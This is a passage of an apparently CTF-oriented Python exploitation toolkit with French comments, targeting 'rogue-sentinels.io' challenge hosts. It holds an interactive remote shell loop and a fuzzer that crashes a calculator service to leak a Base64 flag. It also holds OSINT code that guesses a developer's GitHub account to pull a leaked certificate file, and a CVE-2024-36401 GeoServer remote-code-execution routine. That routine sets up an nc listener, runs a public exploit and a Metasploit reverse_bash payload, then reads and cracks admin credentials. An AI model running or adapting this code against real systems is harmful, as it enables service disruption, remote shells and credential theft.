        print_info("\n=== Shell Interactif (tapez 'exit' pour quitter) ===")
        
        while True:
            cmd = input(f"{Colors.GREEN}shell> {Colors.ENDC}")
            if cmd.lower() == 'exit':
                break
            if cmd:
                result = self.exec_cmd(cmd)
                if result:
                    print(result)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #3: Restricted - DoS + Info Disclosure
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit3_Restricted:
    """
    Exploitation de Restricted via Fuzzing:
    1. Fuzzing exhaustif (x,y,z) jusqu'au crash
    2. RÃ©cupÃ©ration de la page d'erreur
    3. DÃ©codage Base64 du flag
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #3: Restricted - DoS + Information Disclosure")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (dÃ©faut: restricted.rogue-sentinels.io): {Colors.ENDC}") or "restricted.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 64375): {Colors.ENDC}") or "64375"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance...")
        self.recon()
        
        # Ã‰tape 2: Fuzzing exhaustif
        print_info("\n[Ã‰tape 2] Fuzzing exhaustif (x,y,z)...")
        crash_value = self.exhaustive_fuzzing()
        
        if crash_value:
            # Ã‰tape 3: DÃ©clencher le crash et rÃ©cupÃ©rer le flag
            print_info("\n[Ã‰tape 3] Exploitation du crash...")
            flag = self.exploit_crash(crash_value)
            
            if flag:
                print_flag(flag)
                pause()
                return flag
        
        pause()
        return None
    
    def recon(self):
        """Reconnaissance de l'application"""
        try:
            r = self.session.get(self.base_url, timeout=10)
            print_success(f"Application accessible (Status: {r.status_code})")
            
            if 'adder' in r.text.lower() or 'calculator' in r.text.lower():
                print_info("Application: Ultimate Adder (Calculator)")
            
            # Tester l'endpoint /calculate avec une requÃªte normale
            test_r = self.session.get(f"{self.base_url}/calculate", params={'x': 1, 'y': 1, 'z': 1}, timeout=5)
            if test_r.status_code == 200:
                print_success(f"Endpoint /calculate fonctionne (1+1+1 = {test_r.text.strip()})")
                
        except Exception as e:
            print_error(f"Erreur: {e}")
    
    def exhaustive_fuzzing(self):
        """Fuzzing exhaustif: teste (0,0,0), (0,0,1), ..., jusqu'au crash"""
        
        print_info("MÃ©thode de fuzzing:")
        print("  [1] Fuzzing exhaustif (0,0,0 â†’ 0,0,1 â†’ ... lent mais complet)")
        print("  [2] Test de la valeur connue (42069)")
        print("  [3] Entrer une valeur manuellement")
        
        mode = input(f"{Colors.CYAN}Choix (1/2/3): {Colors.ENDC}") or "2"
        
        if mode == "2":
            # Test direct avec somme = 42069
            print_info("Test avec somme = 42069 (x=0, y=0, z=42069)...")
            try:
                r = self.session.post(
                    f"{self.base_url}/calculate",
                    data={'x': 0, 'y': 0, 'z': 42069},
                    timeout=5
                )
                if r.status_code >= 500:
                    print_success(f"Crash confirmÃ©! (Status {r.status_code})")
                    print_success(f"Somme = 0 + 0 + 42069 = 42069")
                    return (0, 0, 42069)
                else:
                    print_info(f"Status {r.status_code} - envoi de requÃªtes supplÃ©mentaires...")
                    # Parfois il faut plusieurs requÃªtes pour crasher
                    for i in range(10):
                        try:
                            r2 = self.session.post(
                                f"{self.base_url}/calculate",
                                data={'x': 0, 'y': 0, 'z': 42069},
                                timeout=5
                            )
                            if r2.status_code >= 500:
                                print_success(f"Crash aprÃ¨s {i+2} requÃªtes!")
                                return (0, 0, 42069)
                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                            print_success(f"Serveur crashÃ© aprÃ¨s {i+2} requÃªtes!")
                            return (0, 0, 42069)
                    
                    print_warning("Pas de crash immÃ©diat...")
                    
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print_success("Crash confirmÃ©! (Timeout/Connection Error)")
                return (0, 0, 42069)
            except Exception as e:
                print_warning(f"Erreur: {e}")
            
            # Demander si on veut continuer
            cont = input(f"{Colors.YELLOW}Utiliser quand mÃªme (0,0,42069)? (o/n): {Colors.ENDC}")
            if cont.lower() == 'o':
                return (0, 0, 42069)
            mode = "1"
        
        if mode == "3":
            x = int(input(f"{Colors.YELLOW}Valeur x: {Colors.ENDC}") or "42069")
            y = int(input(f"{Colors.YELLOW}Valeur y: {Colors.ENDC}") or "0")
            z = int(input(f"{Colors.YELLOW}Valeur z: {Colors.ENDC}") or "0")
            return (x, y, z)
        
        if mode == "1":
            # Fuzzing exhaustif - incrÃ©mente la somme progressivement
            print_info("DÃ©marrage du fuzzing exhaustif...")
            print_info("Le crash arrive quand x + y + z = valeur magique")
            print_info("Test: (0,0,0)â†’(0,0,1)â†’(0,0,2)â†’...â†’(0,0,N)â†’(0,1,0)â†’...")
            print_warning("Ctrl+C pour arrÃªter.")
            print()
            
            tested = 0
            max_val = 50000  # Limite pour chaque variable
            
            try:
                # MÃ©thode 1: Tester z seul d'abord (x=0, y=0, z=0â†’max)
                # C'est la mÃ©thode la plus rapide pour atteindre 42069
                print_info("Phase 1: Test avec z seul (x=0, y=0, z=0â†’50000)...")
                
                for z in range(0, max_val):
                    tested += 1
                    
                    if z % 1000 == 0:
                        print(f"  z={z} (somme={z})...", end='\r')
                    
                    if self.test_crash(0, 0, z):
                        print()
                        print_success(f"CRASH TROUVÃ‰! x=0, y=0, z={z}")
                        print_success(f"Somme = 0 + 0 + {z} = {z}")
                        return (0, 0, z)
                
                print()
                print_info("Phase 2: Test exhaustif complet...")
                
                # MÃ©thode 2: Tester toutes les combinaisons par somme croissante
                for target_sum in range(0, 100000):
                    # GÃ©nÃ©rer des combinaisons qui donnent cette somme
                    # On teste juste quelques combinaisons par somme pour aller vite
                    test_cases = [
                        (target_sum, 0, 0),
                        (0, target_sum, 0),
                        (0, 0, target_sum),
                        (target_sum // 2, target_sum - target_sum // 2, 0),
                        (target_sum // 3, target_sum // 3, target_sum - 2 * (target_sum // 3)),
                    ]
                    
                    for x, y, z in test_cases:
                        if x > 999999 or y > 999999 or z > 999999:
                            continue
                        if x < 0 or y < 0 or z < 0:
                            continue
                            
                        tested += 1
                        
                        if self.test_crash(x, y, z):
                            print()
                            print_success(f"CRASH TROUVÃ‰! x={x}, y={y}, z={z}")
                            print_success(f"Somme = {x} + {y} + {z} = {x+y+z}")
                            return (x, y, z)
                    
                    if target_sum % 5000 == 0:
                        print(f"  Somme testÃ©e: {target_sum}...", end='\r')
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Fuzzing interrompu{Colors.ENDC}")
                
                manual = input(f"{Colors.YELLOW}Entrer les valeurs manuellement? (o/n): {Colors.ENDC}")
                if manual.lower() == 'o':
                    x = int(input(f"{Colors.YELLOW}x: {Colors.ENDC}") or "0")
                    y = int(input(f"{Colors.YELLOW}y: {Colors.ENDC}") or "0")
                    z = int(input(f"{Colors.YELLOW}z: {Colors.ENDC}") or "42069")
                    return (x, y, z)
        
        return None
    
    def test_crash(self, x, y, z):
        """Tester si une combinaison cause un crash"""
        try:
            r = self.session.post(
                f"{self.base_url}/calculate",
                data={'x': x, 'y': y, 'z': z},
                timeout=5
            )
            # Status 200 = PAS de crash, le serveur fonctionne normalement
            # Crash = 500, 502, 503, 504 ou timeout/connection error
            if r.status_code == 200:
                return False  # Pas de crash
            elif r.status_code >= 500:
                print_info(f"  Status {r.status_code} pour ({x},{y},{z})")
                return True  # Crash serveur
            else:
                return False  # Autre status (404, etc.) pas un crash
                
        except requests.exceptions.Timeout:
            print_info(f"  TIMEOUT pour ({x},{y},{z}) - Serveur ne rÃ©pond plus!")
            return True  # Timeout = serveur crashÃ©
        except requests.exceptions.ConnectionError:
            print_info(f"  CONNECTION ERROR pour ({x},{y},{z}) - Serveur down!")
            return True  # Connection error = serveur crashÃ©
        except Exception as e:
            return False
    
    def exploit_crash(self, crash_value):
        """DÃ©clencher le crash et rÃ©cupÃ©rer le flag"""
        
        x, y, z = crash_value
        
        # Ã‰tape 1: DÃ©clencher le crash (peut nÃ©cessiter plusieurs requÃªtes)
        print_info(f"DÃ©clenchement du crash avec x={x}, y={y}, z={z}...")
        
        for i in range(10):
            try:
                self.session.post(
                    f"{self.base_url}/calculate",
                    data={'x': x, 'y': y, 'z': z},
                    timeout=3
                )
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print_success(f"Serveur crashÃ© aprÃ¨s {i+1} requÃªte(s)!")
                break
            except:
                pass
        
        # Ã‰tape 2: Attendre que la page d'erreur s'affiche
        print_info("Attente de la page d'erreur...")
        time.sleep(2)
        
        # Ã‰tape 3: RÃ©cupÃ©rer la page principale (qui devrait afficher l'erreur)
        print_info("RÃ©cupÃ©ration de la page d'erreur (GET sur /)...")
        
        # Utiliser une nouvelle session pour Ã©viter les problÃ¨mes de connexion
        new_session = requests.Session()
        
        try:
            r = new_session.get(self.base_url, timeout=10)
            error_content = r.text
            
            print_info(f"Status: {r.status_code}")
            print_info(f"Longueur rÃ©ponse: {len(error_content)} caractÃ¨res")
            
            # Afficher le contenu complet
            print_info("\n" + "="*60)
            print_info("CONTENU DE LA PAGE D'ERREUR:")
            print("="*60)
            print(error_content)
            print("="*60 + "\n")
            
            # Chercher des chaÃ®nes Base64 (caractÃ©ristique: finit par = ou ==)
            # Pattern amÃ©liorÃ© pour trouver les chaÃ®nes dans le JS/HTML
            b64_patterns = [
                r"'([A-Za-z0-9+/]{10,}={1,2})'",   # Entre quotes simples
                r'"([A-Za-z0-9+/]{10,}={1,2})"',   # Entre quotes doubles
                r': ([A-Za-z0-9+/]{10,}={1,2})',   # AprÃ¨s deux-points
                r'([A-Za-z0-9+/]{20,}={1,2})',     # Pattern gÃ©nÃ©ral long
            ]
            
            all_matches = []
            for pattern in b64_patterns:
                matches = re.findall(pattern, error_content)
                all_matches.extend(matches)
            
            # DÃ©dupliquer
            all_matches = list(set(all_matches))
            
            if all_matches:
                print_success(f"TrouvÃ© {len(all_matches)} chaÃ®ne(s) Base64 potentielle(s):")
                
                for i, b64 in enumerate(all_matches):
                    print(f"\n  [{i+1}] {b64}")
                    
                    try:
                        decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                        print_success(f"      DÃ©codÃ©: {decoded}")
                        
                        # Chercher un flag
                        if 'flag' in decoded.lower() or 'FLAG' in decoded:
                            flag_match = re.search(r'FLAG[_\-\w]+', decoded, re.I)
                            if flag_match:
                                return flag_match.group(0)
                            return decoded.strip()
                            
                    except Exception as e:
                        print_warning(f"      Erreur dÃ©codage: {e}")
            
            # Si pas trouvÃ© automatiquement
            print_warning("\nAucun flag dÃ©codÃ© automatiquement.")
            print_info("Cherchez une chaÃ®ne suspecte qui se termine par '==' dans la page")
            print_info("Exemple: RkxBR19zb21ldGhpbmc9PQ==")
            
        except Exception as e:
            print_error(f"Erreur rÃ©cupÃ©ration page: {e}")
            print_info("Le serveur est peut-Ãªtre encore down...")
        
        # Demander manuellement
        b64_manual = input(f"\n{Colors.YELLOW}ChaÃ®ne Base64 Ã  dÃ©coder (copier-coller): {Colors.ENDC}")
        
        if b64_manual:
            try:
                decoded = base64.b64decode(b64_manual).decode('utf-8')
                print_success(f"DÃ©codÃ©: {decoded}")
                return decoded.strip()
            except Exception as e:
                print_error(f"Erreur dÃ©codage: {e}")
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #4: Staging (Liberty) - OSINT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit4_Staging:
    """
    Exploitation OSINT de Staging:
    1. Analyse du code source pour trouver le dÃ©veloppeur
    2. Recherche automatique sur GitHub
    3. Exploration des repos
    4. RÃ©cupÃ©ration du flag dans les fichiers sensibles
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.developer_name = None
        self.github_username = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #4: Staging (Liberty) - OSINT")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (dÃ©faut: staging.rogue-sentinels.io): {Colors.ENDC}") or "staging.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 19480): {Colors.ENDC}") or "19480"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Ã‰tape 1: Analyse du code source
        print_info("\n[Ã‰tape 1] Analyse du code source...")
        if not self.analyze_source():
            print_error("Impossible de trouver le dÃ©veloppeur")
            pause()
            return None
        
        # Ã‰tape 2: Recherche GitHub automatique
        print_info("\n[Ã‰tape 2] Recherche automatique sur GitHub...")
        if not self.find_github_username():
            # Fallback manuel
            print_warning("Recherche automatique Ã©chouÃ©e")
            print_info("Recherche manuelle sur LinkedIn/GitHub nÃ©cessaire")
            self.github_username = input(f"{Colors.YELLOW}Username GitHub: {Colors.ENDC}")
            
            if not self.github_username:
                pause()
                return None
        
        # Ã‰tape 3: Exploration des repos GitHub
        print_info("\n[Ã‰tape 3] Exploration des repositories GitHub...")
        flag = self.explore_github_repos()
        
        if flag:
            print_flag(flag)
        
        pause()
        return flag
    
    def analyze_source(self):
        """Analyser le code source pour trouver le dÃ©veloppeur"""
        
        try:
            r = self.session.get(self.base_url, timeout=10)
            
            print_success("Page accessible")
            html = r.text
            
            # Chercher les scripts JS
            scripts = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
            
            for script in scripts:
                print_info(f"Script trouvÃ©: {script}")
                
                # TÃ©lÃ©charger le script
                if not script.startswith('http'):
                    script_url = f"{self.base_url}/{script.lstrip('/')}"
                else:
                    script_url = script
                
                try:
                    js_r = self.session.get(script_url, timeout=5)
                    js_content = js_r.text
                    
                    print_info(f"\n--- Contenu de {script} ---")
                    print(js_content[:500])
                    print("---\n")
                    
                    # Chercher des patterns d'auteur
                    author_patterns = [
                        r'(?://|/\*+)\s*(?:Author|Auteur|DÃ©veloppeur|Developer|Created by|By)[\s:]+([^\n\*]+)',
                        r'@author\s+([^\n]+)',
                    ]
                    
                    for pattern in author_patterns:
                        authors = re.findall(pattern, js_content, re.I)
                        for author in authors:
                            author = author.strip()
                            if author and len(author) > 3:
                                print_success(f"DÃ©veloppeur trouvÃ©: {author}")
                                self.developer_name = author
                                return True
                    
                    # Chercher l'entreprise
                    companies = re.findall(r'([\w\s]+(?:Planners|Corp|Inc|LLC|Company|Wealth)[\w\s]*)', js_content)
                    for company in companies:
                        print_info(f"Entreprise: {company.strip()}")
                    
                except Exception as e:
                    print_warning(f"Erreur lecture script: {e}")
            
            # Demander manuellement si pas trouvÃ©
            if not self.developer_name:
                self.developer_name = input(f"{Colors.YELLOW}Nom du dÃ©veloppeur trouvÃ© manuellement: {Colors.ENDC}")
                return bool(self.developer_name)
                
        except Exception as e:
            print_error(f"Erreur: {e}")
            return False
        
        return True
    
    def find_github_username(self):
        """Trouver le username GitHub automatiquement"""
        
        if not self.developer_name:
            return False
        
        print_info(f"Recherche GitHub pour: {self.developer_name}")
        
        # PRIORITÃ‰: Username rÃ©el du CTF EN PREMIER
        priority_usernames = [
            "DiamondHunter153",  # Username rÃ©el du CTF - TESTÃ‰ EN PREMIER
        ]
        
        # Liste de usernames potentiels basÃ©s sur le nom
        name_parts = self.developer_name.split()
        potential_usernames = []
        
        if len(name_parts) >= 2:
            first = name_parts[0]
            last = name_parts[1]
            
            potential_usernames = [
                first.lower() + last.lower(),
                first.lower() + last[0].lower(),
                first[0].lower() + last.lower(),
                first.lower() + "-" + last.lower(),
                first.lower() + "_" + last.lower(),
                last.lower() + first.lower(),
                first.lower() + last.lower() + "123",
            ]
        
        # Ajouter des variations communes
        for username in potential_usernames[:]:
            potential_usernames.append(username.replace(" ", ""))
            potential_usernames.append(username.replace(" ", "-"))
            potential_usernames.append(username.replace(" ", "_"))
        
        # Combiner: prioritaires EN PREMIER
        all_usernames = priority_usernames + potential_usernames
        
        # Tester chaque username
        print_info(f"Test de {len(all_usernames)} usernames potentiels...")
        
        for username in all_usernames:
            try:
                r = self.session.get(f"https://github.com/{username}", timeout=5)
                
                if r.status_code == 200 and 'Page not found' not in r.text:
                    print_success(f"Profil GitHub trouvÃ©: {username}")
                    self.github_username = username
                    return True
                    
            except:
                pass
        
        # Si pas trouvÃ©, essayer une recherche Google
        print_info("Tentative de recherche web...")
        try:
            from urllib.parse import quote
            search_query = f"{self.developer_name} GitHub developer"
            # On ne peut pas vraiment faire une recherche Google ici sans API
            # mais on peut donner des instructions
            print_info(f"Recherchez manuellement: {search_query}")
        except:
            pass
        
        return False
    
    def explore_github_repos(self):
        """Explorer les repositories GitHub pour trouver des secrets"""
        
        if not self.github_username:
            return None
        
        print_info(f"Exploration de github.com/{self.github_username}")
        
        # DIRECT: Aller immÃ©diatement chercher landing-page/alpha.crt
        print_info("\n[ACCÃˆS DIRECT] landing-page/alpha.crt")
        
        for branch in ['main', 'master']:
            raw_url = f"https://raw.githubusercontent.com/{self.github_username}/landing-page/{branch}/alpha.crt"
            
            try:
                print_info(f"Tentative: {raw_url}")
                r = self.session.get(raw_url, timeout=10)
                
                if r.status_code == 200:
                    content = r.text
                    print_success(f"âœ“ Fichier trouvÃ© sur branche '{branch}'!")
                    print_info("\nContenu de alpha.crt:")
                    print(content)
                    print()
                    
                    # Chercher le flag avec le pattern exact: -- ${FLAG_OSINTcertified}
                    flag_match = re.search(r'--\s*\$\{([^}]+)\}', content)
                    if flag_match:
                        flag = flag_match.group(1)
                        print_success(f"FLAG TROUVÃ‰: {flag}")
                        return flag
                    
                    # Pattern alternatif
                    flag_match2 = re.search(r'(FLAG[_\w]+)', content, re.I)
                    if flag_match2:
                        flag = flag_match2.group(1)
                        print_success(f"FLAG TROUVÃ‰: {flag}")
                        return flag
                        
            except Exception as e:
                print_warning(f"Branche {branch}: {e}")
        
        print_error("Impossible d'accÃ©der Ã  landing-page/alpha.crt")
        return None
    
    def explore_repo_files(self, username, repo_name):
        """Explorer les fichiers d'un repository"""
        
        try:
            # API GitHub pour lister les fichiers
            api_url = f"https://api.github.com/repos/{username}/{repo_name}/contents"
            r = self.session.get(api_url, timeout=10)
            
            if r.status_code != 200:
                return None
            
            files = r.json()
            
            # Parcourir les fichiers
            for file_info in files:
                if isinstance(file_info, dict):
                    filename = file_info.get('name', '')
                    file_type = file_info.get('type', '')
                    
                    print(f"    - {filename}")
                    
                    # Fichiers suspects Ã  examiner
                    suspicious_extensions = ['.crt', '.pem', '.key', '.env', '.txt', '.md']
                    suspicious_names = ['secret', 'credential', 'password', 'flag', 'alpha', 'config']
                    
                    is_suspicious = any(ext in filename.lower() for ext in suspicious_extensions)
                    is_suspicious = is_suspicious or any(name in filename.lower() for name in suspicious_names)
                    
                    if is_suspicious and file_type == 'file':
                        print_warning(f"      âš ï¸ Fichier suspect: {filename}")
                        
                        # TÃ©lÃ©charger le contenu
                        raw_url = f"https://raw.githubusercontent.com/{username}/{repo_name}/main/{filename}"
                        
                        # Essayer aussi 'master' si 'main' ne marche pas
                        for branch in ['main', 'master']:
                            raw_url = f"https://raw.githubusercontent.com/{username}/{repo_name}/{branch}/{filename}"
                            
                            try:
                                content_r = self.session.get(raw_url, timeout=5)
                                
                                if content_r.status_code == 200:
                                    content = content_r.text
                                    
                                    print_info(f"      Contenu de {filename}:")
                                    print(f"{content[:800]}")
                                    
                                    # Chercher un flag
                                    flag_patterns = [
                                        r'\$\{FLAG[_\w]+\}',
                                        r'FLAG[_\-\w]+',
                                        r'flag[_\-\w]+',
                                    ]
                                    
                                    for pattern in flag_patterns:
                                        flag_match = re.search(pattern, content, re.I)
                                        if flag_match:
                                            flag = flag_match.group(0)
                                            print_success(f"      FLAG TROUVÃ‰: {flag}")
                                            return flag
                                    
                                    break  # Si on a pu tÃ©lÃ©charger, pas besoin de tester l'autre branche
                                    
                            except Exception as e:
                                pass
            
        except Exception as e:
            print_warning(f"Erreur exploration repo: {e}")
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #5: WebServices - CVE-2024-36401 GeoServer
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit5_WebServices:
    """
    Exploitation CVE-2024-36401 sur GeoServer:
    1. Identification automatique de GeoServer
    2. RÃ©cupÃ©ration automatique de l'IP locale
    3. Exploitation automatique (Python ou Metasploit)
    4. RÃ©cupÃ©ration et crack automatique du hash
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.local_ip = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #5: WebServices - CVE-2024-36401 GeoServer RCE")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (dÃ©faut: webservices.rogue-sentinels.io): {Colors.ENDC}") or "webservices.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 8080): {Colors.ENDC}") or "8080"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance de GeoServer...")
        version = self.recon()
        
        # Ã‰tape 2: RÃ©cupÃ©ration de l'IP locale
        print_info("\n[Ã‰tape 2] RÃ©cupÃ©ration de l'IP locale...")
        self.get_local_ip()
        
        # Ã‰tape 3: Choix de la mÃ©thode d'exploitation
        print_info("\n[Ã‰tape 3] Choix de la mÃ©thode d'exploitation...")
        print("  [1] Script Python (automatique)")
        print("  [2] Metasploit (automatique)")
        print("  [3] Manuel")
        
        choice = input(f"{Colors.CYAN}MÃ©thode (1/2/3): {Colors.ENDC}") or "1"
        
        if choice == "1":
            success = self.exploit_python()
        elif choice == "2":
            success = self.exploit_metasploit()
        else:
            success = self.exploit_manual()
        
        if not success:
            print_error("Exploitation Ã©chouÃ©e")
            pause()
            return None
        
        # Ã‰tape 4: RÃ©cupÃ©ration des credentials
        print_info("\n[Ã‰tape 4] RÃ©cupÃ©ration des credentials...")
        creds = self.get_credentials_auto()
        
        # Ã‰tape 5: Crack du hash
        print_info("\n[Ã‰tape 5] Crack du hash...")
        password = self.crack_hash_auto(creds)

        if password:
            username = creds.get('username', 'admin')
            flag = f"{username}:{password}"
            print_flag(flag)
            pause()
            return flag
        
        pause()
        return None
    
    def recon(self):
        """Reconnaissance automatique de GeoServer"""
        
        paths = ['/geoserver', '/geoserver/web', '/']
        
        for path in paths:
            try:
                r = self.session.get(f"{self.base_url}{path}", timeout=10)
                
                if 'geoserver' in r.text.lower():
                    print_success(f"GeoServer dÃ©tectÃ©: {path}")
                    
                    # Version
                    version_match = re.search(r'GeoServer\s*([\d\.]+)', r.text)
                    if version_match:
                        version = version_match.group(1)
                        print_success(f"Version: {version}")
                        return version
                    
                    return "Unknown"
            except:
                pass
        
        print_warning("GeoServer non dÃ©tectÃ©, on continue quand mÃªme...")
        return None
    
    def get_local_ip(self):
        """RÃ©cupÃ©rer l'IP locale automatiquement"""
        
        try:
            # MÃ©thode 1: via socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            print_success(f"IP locale dÃ©tectÃ©e: {self.local_ip}")
            return True
        except:
            pass
        
        try:
            # MÃ©thode 2: via hostname
            hostname = socket.gethostname()
            self.local_ip = socket.gethostbyname(hostname)
            print_success(f"IP locale dÃ©tectÃ©e: {self.local_ip}")
            return True
        except:
            pass
        
        # MÃ©thode 3: parser ifconfig/ip addr
        try:
            result = run_command("ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1")
            if result and result.strip():
                self.local_ip = result.strip()
                print_success(f"IP locale dÃ©tectÃ©e: {self.local_ip}")
                return True
        except:
            pass
        
        # Fallback: demander manuellement
        print_warning("Impossible de dÃ©tecter l'IP locale automatiquement")
        self.local_ip = input(f"{Colors.YELLOW}Entrez votre IP locale: {Colors.ENDC}")
        return bool(self.local_ip)
    
    def exploit_python(self):
        """Exploitation automatique avec le script Python"""
        
        print_info("\n=== EXPLOITATION AVEC SCRIPT PYTHON (VENV) ===")
        
        exploit_dir = "./webservices/files/CVE-2024-36401"
        venv_python = f"{exploit_dir}/venv/bin/python3"
        
        # VÃ©rifier si l'exploit existe dÃ©jÃ 
        if not os.path.exists(exploit_dir):
            print_info("Clonage de l'exploit...")
            result = run_command("git clone https://github.com/jakabakos/CVE-2024-36401 ./webservices/files/CVE-2024-36401", timeout=30)
            
            if "fatal" in result.lower() or not os.path.exists(exploit_dir):
                print_error("Ã‰chec du clonage")
                return False
            
            print_success("Exploit clonÃ©")
        else:
            print_success("Exploit dÃ©jÃ  prÃ©sent")
        
        # VÃ©rifier si le venv existe, sinon le crÃ©er
        if not os.path.exists(venv_python):
            print_info("CrÃ©ation de l'environnement virtuel...")
            result = run_command(f"cd {exploit_dir} && python3 -m venv venv", timeout=30)
            
            print_info("Installation des dÃ©pendances...")
            result = run_command(f"cd {exploit_dir} && ./venv/bin/pip install -r requirements.txt", timeout=120)
            
            if "successfully installed" in result.lower() or "requirement already satisfied" in result.lower():
                print_success("DÃ©pendances installÃ©es")
            else:
                print_warning("VÃ©rifiez l'installation des dÃ©pendances")
                print_info(f"RÃ©sultat:\n{result[:300]}")
        else:
            print_success("Environnement virtuel dÃ©jÃ  configurÃ©")
        
        # Lancer le listener en arriÃ¨re-plan
        lport = 1337
        print_info(f"Lancement du listener sur le port {lport}...")
        
        listener_cmd = f"nc -lvnp {lport}"
        print_info(f"Commande: {listener_cmd}")
        
        # CrÃ©er un script pour le listener
        listener_script = f"/tmp/listener_{lport}.sh"
        with open(listener_script, 'w') as f:
            f.write(f"#!/bin/bash\n{listener_cmd}\n")
        os.chmod(listener_script, 0o755)
        
        print_warning("Ouvrez un NOUVEAU terminal et exÃ©cutez:")
        print(f"{Colors.CYAN}{listener_cmd}{Colors.ENDC}")
        print()
        
        input(f"{Colors.YELLOW}Appuyez sur EntrÃ©e une fois le listener lancÃ©...{Colors.ENDC}")
        
        # Lancer l'exploit avec le Python du venv
        print_info("Lancement de l'exploit...")
        
        # Utiliser le chemin relatif du Python du venv (car on est dÃ©jÃ  dans exploit_dir aprÃ¨s le cd)
        exploit_cmd = f"cd {exploit_dir} && ./venv/bin/python3 exploit_fix.py -u {self.base_url} -ip {self.local_ip} -rp {lport}"
        print_info(f"Commande: {exploit_cmd}")
        print_info(f"Python utilisÃ©: ./venv/bin/python3 (relatif Ã  {exploit_dir})")
        
        # ExÃ©cuter l'exploit en arriÃ¨re-plan
        print_info("ExÃ©cution de l'exploit (cela peut prendre 10-30 secondes)...")
        result = run_command(exploit_cmd, timeout=60)
        
        print_info(f"RÃ©sultat:\n{result[:500]}")
        
        if "error" in result.lower() or "traceback" in result.lower():
            print_warning("Des erreurs sont apparues, vÃ©rifiez le listener")
            print_info(f"DÃ©tails:\n{result}")
        
        print_info("\nVÃ©rifiez votre listener. Si vous avez un shell:")
        print("  1. Tapez: ls -la")
        print("  2. Tapez: cat ADMIN_CREDENTIALS.txt")
        print()
        
        has_shell = input(f"{Colors.YELLOW}Avez-vous obtenu un shell? (o/n): {Colors.ENDC}")
        return has_shell.lower() == 'o'
    
    def exploit_metasploit(self):
        """Exploitation automatique avec Metasploit"""
        
        print_info("\n=== EXPLOITATION AVEC METASPLOIT ===")
        
        # VÃ©rifier si msfconsole est installÃ©
        result = run_command("which msfconsole", timeout=5)
        if not result or "not found" in result:
            print_error("Metasploit n'est pas installÃ©")
            return False
        
        print_success("Metasploit dÃ©tectÃ©")
        
        # CrÃ©er un fichier de commandes Metasploit
        lport = 1337
        rc_file = "/tmp/geoserver_exploit.rc"
        
        rc_content = f"""use exploit/multi/http/geoserver_unauth_rce_cve_2024_36401
set RHOSTS {self.base_url.replace('http://', '').replace('https://', '').split(':')[0]}
set RPORT {self.base_url.split(':')[-1]}
set LHOST {self.local_ip}
set LPORT {lport}
set PAYLOAD cmd/unix/reverse_bash
set VERBOSE true
exploit
"""
        
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        print_info(f"Configuration Metasploit crÃ©Ã©e: {rc_file}")
        print_info("Lancement de Metasploit...")
        
